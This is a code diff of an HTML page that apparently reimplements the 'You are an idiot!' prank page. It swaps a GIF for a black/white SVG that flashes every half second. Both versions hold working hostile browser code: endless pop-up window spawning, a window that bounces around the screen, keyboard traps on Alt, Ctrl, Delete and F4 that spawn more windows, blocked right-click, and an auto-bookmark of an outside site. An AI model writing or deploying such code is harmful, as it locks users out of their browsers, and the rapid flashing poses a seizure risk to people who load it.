@@ -11,79 +11,102 @@
 
     <!-- The actual content (hidden behind the mask) -->
     <div align="center" style="visibility:hidden;">
-        <img id="idiot_gif" src="flashl.gif" alt="You are an idiot!" width="640" height="480">
+        <img id="idiot_gif" src="svg/black.svg" alt="You are an idiot!" width="640" height="480">
     </div>
 
     <bgsound id="bg_audio" src="idiotl.mp3" loop="infinite">
 
     <script language="Javascript">
-    function blockRightClick() { return false; }
-    function addBookmark() {
-        if (navigator.appName == "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {
-            window.external.AddFavorite("https://yaai.adngsnews.site/legacy.html", "You are an idiot!");
+        // --- IE4/5 safe named functions ---
+        function blockRightClick() {
+            return false;
         }
-    }
 
-    var flagRun = 1;
-    var xOff = 5;
-    var yOff = 5;
-    var xPos = 400;
-    var yPos = -100;
-
-    function playBall() {
-        if (flagRun != 1) return;
-        xPos += xOff;
-        yPos += yOff;
-        if (xPos > screen.width - 357) xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-        if (xPos < 0) xOff = Math.ceil(7 * Math.random()) * 5 - 10;
-        if (yPos > screen.height - 330) yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-        if (yPos < 0) yOff = Math.ceil(7 * Math.random()) * 5 - 10;
-        window.moveTo(xPos, yPos);
-        setTimeout("playBall()", 1); /* <--- SetTimeout is the ONLY thing that works in 1995! */
-    }
-
-    function openWindow(url) {
-        window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
-    }
-
-    function procreate() {
-        for (var i = 0; i < 5; i++) {
-            openWindow('loll.html');
+        // --- Auto-Bookmark the site (whenever they click anywhere) ---
+        function addBookmark() {
+            if (navigator.appName == "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {
+                window.external.AddFavorite("https://yaai.adngsnews.site/legacy.html", "You are an idiot!");
+            }
         }
-    }
 
-    function startChaos() {
-        document.title = "You are an idiot!";
-        playBall();
-        procreate();
-        setInterval("procreate()", 2500);
-    }
+        // --- Load & Reveal the Chaos ---
+        function revealChaos() {
+            // 1. Show the SVG
+            document.getElementById("idiot_gif").style.visibility = "visible";
 
-    function revealChaos() {
-        document.getElementById("idiot_gif").style.visibility = "visible";
-        document.getElementById("loading_mask").style.display = "none";
-        document.title = "You are an idiot!";
-        startChaos();
-    }
+            // 2. Remove the loading mask
+            document.getElementById("loading_mask").style.display = "none";
 
-    function keyTrap() {
-        if (event.keyCode == 18 || event.keyCode == 115) {
-            alert("You are an idiot!");
+            // 3. Change the title to the truth
+            document.title = "You are an idiot!";
+
+            // 4. Bounce the window
+            flagRun = 1;
+            playBall();
+
+            // 5. Spawn the pop-ups
             procreate();
+            setInterval("procreate()", 2500);
         }
-        if (event.keyCode == 17) {
-            alert("You are an idiot!");
-            procreate();
-        }
-        if (event.keyCode == 46) {
-            alert("You are an idiot!");
-            procreate();
-        }
-    }
 
-    document.onkeydown = keyTrap;
-    document.oncontextmenu = blockRightClick;
-    setTimeout("revealChaos()", 3000);
-</script>
+        // The SVG flash loop
+        var isBlack = true;
+        function flashSVG() {
+            isBlack = !isBlack;
+            document.getElementById("idiot_gif").src = isBlack ? "svg/black.svg" : "svg/white.svg";
+        }
+
+        var flagRun = 1;
+        var xOff = 5;
+        var yOff = 5;
+        var xPos = 400;
+        var yPos = -100;
+
+        function playBall() {
+            if (flagRun != 1) return;
+            xPos += xOff;
+            yPos += yOff;
+            if (xPos > screen.width - 357) xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+            if (xPos < 0) xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+            if (yPos > screen.height - 330) yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+            if (yPos < 0) yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+            window.moveTo(xPos, yPos);
+            setTimeout("playBall()", 1);
+        }
+
+        function openWindow(url) {
+            window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
+        }
+
+        // --- Uses loll.html now ---
+        function procreate() {
+            for (var i = 0; i < 5; i++) {
+                openWindow('loll.html');
+            }
+        }
+
+        // Named function for keyboard traps
+        function keyTrap() {
+            if (event.keyCode == 18 || event.keyCode == 115) {
+                alert("You are an idiot!");
+                procreate();
+            }
+            if (event.keyCode == 17) {
+                alert("You are an idiot!");
+                procreate();
+            }
+            if (event.keyCode == 46) {
+                alert("You are an idiot!");
+                procreate();
+            }
+        }
+
+        document.onkeydown = keyTrap;
+        document.oncontextmenu = blockRightClick;
+
+        // --- Wait for GIF to load before revealing chaos ---
+        setTimeout("revealChaos()", 3000);
+        setInterval("flashSVG()", 500); // 0.5 seconds
+    </script>
 </body>
 </html>
